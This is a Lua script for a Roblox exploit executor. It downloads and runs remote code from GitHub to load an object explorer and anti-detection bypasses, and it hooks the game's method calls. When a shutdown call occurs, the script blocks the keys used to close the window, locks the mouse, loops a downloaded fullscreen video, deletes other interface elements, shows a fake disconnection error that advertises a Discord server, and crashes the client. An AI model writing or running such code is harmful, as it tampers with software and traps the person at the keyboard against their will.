if not isfile("raw video natsurblx2006.mp4") then
    writefile('raw video natsurblx2006.mp4', game:HttpGet('https://drive.google.com/u/0/uc?id=1DkznW0_uDEmOTe_iyDSr7nZIp-7CUIR3&export=download'))
end

spawn(function()
    local dexed = false
    function dex()
        dexed = true
        -- Cloneref support (adds support for JJsploit/Temple/Electron and other sploits that don't have cloneref or really shit versions of it.)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/CloneRef.lua", true))()

    -- Dex Bypasses
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Bypasses.lua", true))()

    -- Dex with CloneRef Support (made as global)
    getgenv().Bypassed_Dex = game:GetObjects("rbxassetid://9352453730")[1]

    local charset = {}
    for i = 48,  57 do table.insert(charset, string.char(i)) end
    for i = 65,  90 do table.insert(charset, string.char(i)) end
    for i = 97, 122 do table.insert(charset, string.char(i)) end
    function RandomCharacters(length)
        if length > 0 then
            return RandomCharacters(length - 1) .. charset[math.random(1, #charset)]
        else
            return ""
        end
    end

    Bypassed_Dex.Name = "Nothing Dex"
    if gethui then
        Bypassed_Dex.Parent = gethui();
    elseif syn and syn.protect_gui then
        syn.protect_gui(Bypassed_Dex);
        Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui"))
    else
        Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui"))
    end

    local function Load(Obj, Url)
        local function GiveOwnGlobals(Func, Script)
            local Fenv = {}
            local RealFenv = {script = Script}
            local FenvMt = {}
            function FenvMt:__index(b)
                if RealFenv[b] == nil then
                    return getfenv()[b]
                else
                    return RealFenv[b]
                end
            end
            function FenvMt:__newindex(b, c)
                if RealFenv[b] == nil then
                    getfenv()[b] = c
                else
                    RealFenv[b] = c
                end
            end
            setmetatable(Fenv, FenvMt)
            setfenv(Func, Fenv)
            return Func
        end
        
        local function LoadScripts(Script)
            if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
                task.spawn(GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script))
            end
            for _,v in ipairs(Script:GetChildren()) do
                LoadScripts(v)
            end
        end
        
        LoadScripts(Obj)
end

Load(Bypassed_Dex)
    end
    while task.wait(2) do
        local bucac = getrawmetatable(game)
        local concu = bucac.__namecall
        setreadonly(bucac, false)

        bucac.__namecall = function(T, ...)
            if getnamecallmethod() == "Shutdown" then
                            if not dexed then
            dex()
        end
                    
                for i, v in pairs(game) do
                    v.Name = "dick" 
                end
          
                for i, v in pairs(game) do
                    v.Name = "pussy"
                end

                local runService = game:GetService("RunService")
                local camera = workspace.CurrentCamera

                local disabledKeyCodes = {
                    0x73;
                    0xA4;
                    0xA5;
                    0x1B;
                    0x0D;
                };

                runService.RenderStepped:Connect(function()
                    for _, keyCode in next, disabledKeyCodes do
                        keyrelease(keyCode)
                    end

                    mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);
                end);

                local first = false

                local getsynasset = getsynasset or getcustomasset

                local screengui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
                screengui.IgnoreGuiInset = true
                screengui.ResetOnSpawn = false
                
                local videoframe = Instance.new("VideoFrame", screengui)
                    videoframe.Visible = true
                    videoframe.Size = UDim2.new(1,0,1,0)
                    videoframe.Video = getsynasset("raw video natsurblx2006.mp4")
                    videoframe:Play()
                    videoframe.Name = "shit"
                    videoframe.Looped = true 

                local EmotesMenu = Instance.new("Frame")
                local ErrorMessage = Instance.new("Frame")
                local SizeConstraint = Instance.new("UISizeConstraint")
                local AsspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
                local ErrorText = Instance.new("TextLabel")
                local SizeConstraint_2 = Instance.new("UISizeConstraint")
                local TextSizeConstraint = Instance.new("UITextSizeConstraint")
                local ErrorIcon = Instance.new("ImageLabel")
                local AsspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")

                EmotesMenu.Name = "EmotesMenu"
                EmotesMenu.Parent = screengui
                EmotesMenu.BackgroundTransparency = 1.000
                EmotesMenu.BorderSizePixel = 0
                EmotesMenu.Position = UDim2.new(0, 0, 0, -36)
                EmotesMenu.Size = UDim2.new(1, 0, 1, 36)
                EmotesMenu.ZIndex = 50

                ErrorMessage.Name = "ErrorMessage"
                ErrorMessage.Parent = EmotesMenu
                ErrorMessage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                ErrorMessage.BackgroundTransparency = 0.300
                ErrorMessage.BorderSizePixel = 0
                ErrorMessage.Position = UDim2.new(0, 0, 0.055, 0)
                ErrorMessage.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)

                SizeConstraint.Name = "SizeConstraint"
                SizeConstraint.Parent = ErrorMessage
                SizeConstraint.MaxSize = Vector2.new(432, 72)
                SizeConstraint.MinSize = Vector2.new(336, 56)

                AsspectRatioConstraint.Name = "AsspectRatioConstraint"
                AsspectRatioConstraint.Parent = ErrorMessage
                AsspectRatioConstraint.AspectRatio = 6.000

                ErrorText.Name = "ErrorText"
                ErrorText.Parent = ErrorMessage
                ErrorText.AnchorPoint = Vector2.new(0, 0.5)
                ErrorText.BackgroundTransparency = 1.000
                ErrorText.Position = UDim2.new(0.200000003, -10, 0.5, 0)
                ErrorText.Size = UDim2.new(0.800000012, 0, 1, 0)
                ErrorText.Font = Enum.Font.Gotham
                ErrorText.Text = "An error occurred, your client got disconnected from the Server! (ERR_MSG: .gg/nothinghub nothing hub the best)"
                ErrorText.TextColor3 = Color3.fromRGB(255, 255, 255)
                ErrorText.TextScaled = true
                ErrorText.TextSize = 36.000
                ErrorText.TextWrapped = true
                ErrorText.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_2.Name = "SizeConstraint"
                SizeConstraint_2.Parent = ErrorText
                SizeConstraint_2.MaxSize = Vector2.new(432, 46)

                TextSizeConstraint.Name = "TextSizeConstraint"
                TextSizeConstraint.Parent = ErrorText
                TextSizeConstraint.MaxTextSize = 36

                ErrorIcon.Name = "ErrorIcon"
                ErrorIcon.Parent = ErrorMessage
                ErrorIcon.AnchorPoint = Vector2.new(0, 0.5)
                ErrorIcon.BackgroundTransparency = 1.000
                ErrorIcon.Position = UDim2.new(0, 10, 0.5, 0)
                ErrorIcon.Size = UDim2.new(0.200000003, -20, 1, -20)
                ErrorIcon.Image = "rbxasset://textures/ui/Emotes/ErrorIcon.png"

                AsspectRatioConstraint_2.Name = "AsspectRatioConstraint"
                AsspectRatioConstraint_2.Parent = ErrorIcon

                if _s ~= nil then
                    _s:Destroy()
                end

                spawn(function()
                    while wait() do
                        for i, v in pairs(game.CoreGui:GetChildren()) do
                            if v:FindFirstChild("shit") or v.Name == "Nothing Dex" then return end
                            v:Destroy()
                        end
        
                        for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
                            if v:FindFirstChild("shit") or v.Name == "Nothing Dex" then return end
                            v:Destroy()
                        end
                    end
                end)

                videoframe.Ended:Connect(function()
                    local succ, err = pcall(function()
                        game:Destroy()
                    end)

                    if not succ then 
                        game.Players.LocalPlayer:Kick()
                        game:Shutdown()
                    end
                end)
                
                settings():GetService("NetworkSettings").IncomingReplicationLag = 9e9
            end
            return concu(T, ...)
        end
    end
end)
